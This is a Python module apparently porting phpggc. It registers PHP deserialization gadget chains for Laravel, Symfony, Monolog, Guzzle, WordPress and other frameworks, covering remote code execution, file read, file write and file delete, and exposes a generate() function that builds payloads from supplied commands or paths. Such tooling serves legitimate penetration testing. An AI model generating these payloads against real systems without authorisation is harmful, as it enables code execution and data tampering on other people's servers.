"""Chain registry and unified generate() API mirroring phpggc CLI."""
from __future__ import annotations

from dataclasses import dataclass
from typing import Any, Callable

from .chains import codeigniter4, dompdf, guzzle, grav, laminas, laravel, mediawiki, monolog, pydio, symfony, wordpress
from .phar import build_phar_from_options
from .platform import GenerateOptions, apply_platform, maybe_wrap


@dataclass(frozen=True)
class ChainSpec:
    name: str
    parameters: tuple[str, ...]
    default_fast_destruct: bool
    builder: Callable[..., bytes]

    def build_raw(self, **kwargs: Any) -> bytes:
        fd = kwargs.pop("fast_destruct", self.default_fast_destruct)
        if self.parameters == ("function", "parameter"):
            fn = kwargs.pop("function")
            param = kwargs.pop("parameter")
            if self.name == "laravel/rce9":
                return self.builder(param, fast_destruct=fd)
            if self.name in ("laravel/rce13", "laravel/rce14", "laravel/rce2", "laravel/rce1"):
                return self.builder(fn, param, fast_destruct=fd)
            return self.builder(fn, param, fast_destruct=fd)
        if self.parameters == ("command",):
            cmd = kwargs.pop("command")
            return self.builder(cmd, fast_destruct=fd)
        if self.parameters == ("code",):
            code = kwargs.pop("code")
            return self.builder(code, fast_destruct=fd)
        if self.parameters == ("remote_path",):
            path = kwargs.pop("remote_path")
            return self.builder(path, fast_destruct=fd)
        if self.parameters == ("remote_path", "data"):
            path = kwargs.pop("remote_path")
            data = kwargs.pop("data")
            return self.builder(path, data, fast_destruct=fd, **kwargs)
        if self.parameters == ():
            return self.builder(fast_destruct=fd, **kwargs)
        return self.builder(fast_destruct=fd, **kwargs)


def _fc(name: str, fn: Callable[..., bytes], *, fd: bool = False) -> ChainSpec:
    return ChainSpec(name, ("function", "parameter"), fd, fn)


def _cmd(name: str, fn: Callable[..., bytes], *, fd: bool = False) -> ChainSpec:
    return ChainSpec(name, ("command",), fd, fn)


def _code(name: str, fn: Callable[..., bytes], *, fd: bool = False) -> ChainSpec:
    return ChainSpec(name, ("code",), fd, fn)


def _path(name: str, fn: Callable[..., bytes], *, fd: bool = False) -> ChainSpec:
    return ChainSpec(name, ("remote_path",), fd, fn)


def _none(name: str, fn: Callable[..., bytes], *, fd: bool = False) -> ChainSpec:
    return ChainSpec(name, (), fd, fn)


def _fw(name: str, fn: Callable[..., bytes], *, fd: bool = False) -> ChainSpec:
    return ChainSpec(name, ("remote_path", "data"), fd, fn)


CHAINS: dict[str, ChainSpec] = {
    "laravel/rce1": _fc("laravel/rce1", laravel.build_rce1),
    "laravel/rce2": _fc("laravel/rce2", laravel.build_rce2, fd=True),
    "laravel/rce3": _fc("laravel/rce3", laravel.build_rce3),
    "laravel/rce4": _fc("laravel/rce4", laravel.build_rce4),
    "laravel/rce5": _code("laravel/rce5", laravel.build_rce5),
    "laravel/rce6": _code("laravel/rce6", laravel.build_rce6),
    "laravel/rce7": _fc("laravel/rce7", laravel.build_rce7),
    "laravel/rce8": _fc("laravel/rce8", laravel.build_rce8),
    "laravel/rce9": _fc("laravel/rce9", laravel.build_rce9, fd=True),
    "laravel/rce10": _fc("laravel/rce10", laravel.build_rce10),
    "laravel/rce11": _fc("laravel/rce11", laravel.build_rce11),
    "laravel/rce12": _fc("laravel/rce12", laravel.build_rce12),
    "laravel/rce13": _fc("laravel/rce13", laravel.build_rce13),
    "laravel/rce14": _fc("laravel/rce14", laravel.build_rce14, fd=True),
    "laravel/rce15": _fc("laravel/rce15", laravel.build_rce15),
    "laravel/rce16": _fc("laravel/rce16", laravel.build_rce16),
    "laravel/rce17": _fc("laravel/rce17", laravel.build_rce17),
    "laravel/rce18": _code("laravel/rce18", laravel.build_rce18),
    "laravel/rce19": _cmd("laravel/rce19", laravel.build_rce19),
    "laravel/rce20": _fc("laravel/rce20", laravel.build_rce20),
    "laravel/rce21": _fc("laravel/rce21", laravel.build_rce21),
    "laravel/rce22": _fc("laravel/rce22", laravel.build_rce22),
    "laravel/fd1": _path("laravel/fd1", laravel.build_fd1),
    "monolog/rce1": _fc("monolog/rce1", monolog.build_rce1),
    "monolog/rce2": _fc("monolog/rce2", monolog.build_rce2),
    "monolog/rce3": _fc("monolog/rce3", monolog.build_rce3),
    "monolog/rce4": _cmd("monolog/rce4", monolog.build_rce4),
    "monolog/rce5": _fc("monolog/rce5", monolog.build_rce5),
    "monolog/rce6": _fc("monolog/rce6", monolog.build_rce6),
    "monolog/rce7": _fc("monolog/rce7", monolog.build_rce7),
    "monolog/rce8": _fc("monolog/rce8", monolog.build_rce8),
    "monolog/rce9": _fc("monolog/rce9", monolog.build_rce9),
    "monolog/fw1": _fw("monolog/fw1", monolog.build_fw1),
    "guzzle/rce1": _fc("guzzle/rce1", guzzle.build_rce1),
    "guzzle/info1": _none("guzzle/info1", guzzle.build_info1),
    "guzzle/fw1": _fw("guzzle/fw1", guzzle.build_fw1),
    "symfony/rce1": _cmd("symfony/rce1", symfony.build_rce1),
    "symfony/rce2": _code("symfony/rce2", symfony.build_rce2),
    "symfony/rce3": _code("symfony/rce3", symfony.build_rce3),
    "symfony/rce4": _fc("symfony/rce4", symfony.build_rce4),
    "symfony/rce5": _fc("symfony/rce5", symfony.build_rce5),
    "symfony/rce6": _cmd("symfony/rce6", symfony.build_rce6),
    "symfony/rce7": _fc("symfony/rce7", symfony.build_rce7),
    "symfony/rce8": _fc("symfony/rce8", symfony.build_rce8),
    "symfony/rce9": _fc("symfony/rce9", symfony.build_rce9),
    "symfony/rce10": _fc("symfony/rce10", symfony.build_rce10),
    "symfony/rce11": _fc("symfony/rce11", symfony.build_rce11),
    "symfony/rce12": _fc("symfony/rce12", symfony.build_rce12),
    "symfony/rce13": _fc("symfony/rce13", symfony.build_rce13),
    "symfony/rce14": _fc("symfony/rce14", symfony.build_rce14),
    "symfony/rce15": _fc("symfony/rce15", symfony.build_rce15),
    "symfony/rce16": _fc("symfony/rce16", symfony.build_rce16),
    "symfony/fd1": _path("symfony/fd1", symfony.build_fd1),
    "symfony/fw1": _fw("symfony/fw1", symfony.build_fw1),
    "symfony/fw2": _fw("symfony/fw2", symfony.build_fw2),
    "laminas/fd1": _path("laminas/fd1", laminas.build_fd1),
    "laminas/fw1": _fw("laminas/fw1", laminas.build_fw1),
    "dompdf/fd1": _path("dompdf/fd1", dompdf.build_fd1),
    "dompdf/fd2": _path("dompdf/fd2", dompdf.build_fd2),
    "mediawiki/fd1": _path("mediawiki/fd1", mediawiki.build_fd1),
    "mediawiki/fw1": _fw("mediawiki/fw1", mediawiki.build_fw1),
    "grav/fd1": _path("grav/fd1", grav.build_fd1),
    "codeigniter4/fd1": _path("codeigniter4/fd1", codeigniter4.build_fd1),
    "codeigniter4/fd2": _path("codeigniter4/fd2", codeigniter4.build_fd2),
    "codeigniter4/fr1": _path("codeigniter4/fr1", codeigniter4.build_fr1),
    "codeigniter4/rce1": _fc("codeigniter4/rce1", codeigniter4.build_rce1),
    "wordpress/guzzle/rce1": _fc("wordpress/guzzle/rce1", wordpress.build_guzzle_rce1),
    "pydio/guzzle/rce1": _fc("pydio/guzzle/rce1", pydio.build_guzzle_rce1),
}


def normalize_chain(name: str) -> str:
    return name.lower().replace("\\", "/")


def list_chains(prefix: str = "") -> list[str]:
    p = normalize_chain(prefix)
    return sorted(k for k in CHAINS if k.startswith(p))


def get_chain(name: str, *, allow_missing: bool = False) -> ChainSpec | None:
    key = normalize_chain(name)
    if key not in CHAINS:
        if allow_missing:
            return None
        raise KeyError(f"Unknown chain {name!r}; known: {', '.join(list_chains())}")
    return CHAINS[key]


def generate(
    chain: str,
    *args: str,
    options: GenerateOptions | None = None,
    fallback_phpggc: bool | None = None,
    **kwargs: Any,
) -> bytes | str:
    """Build a gadget chain with optional platform features (phpggc-compatible).

    Unported chains fall back to local phpggc when ``fallback_phpggc`` is True
    (default on ``GenerateOptions``).
    """
    spec = get_chain(chain, allow_missing=True)
    use_fallback = fallback_phpggc if fallback_phpggc is not None else (
        options.fallback_phpggc if options is not None else True
    )
    if spec is None:
        if not use_fallback:
            raise KeyError(f"Unknown chain {chain!r}; known: {', '.join(list_chains())}")
        from .bridge import generate_via_phpggc

        bridge_opts = options if options is not None else GenerateOptions()
        return generate_via_phpggc(chain, args, bridge_opts)

    if options is None:
        opts = GenerateOptions(fast_destruct=spec.default_fast_destruct)
    else:
        opts = options
    params = dict(zip(spec.parameters, args))
    params.update(kwargs)
    params["fast_destruct"] = opts.fast_destruct
    raw = spec.build_raw(**params)
    if opts.phar:
        raw = build_phar_from_options(raw, opts)
    out = apply_platform(raw.decode("latin-1"), opts)
    if opts.trailing_newline:
        out = out + b"\n" if isinstance(out, bytes) else out + "\n"
        if isinstance(out, str):
            return out.encode("latin-1")
    return out
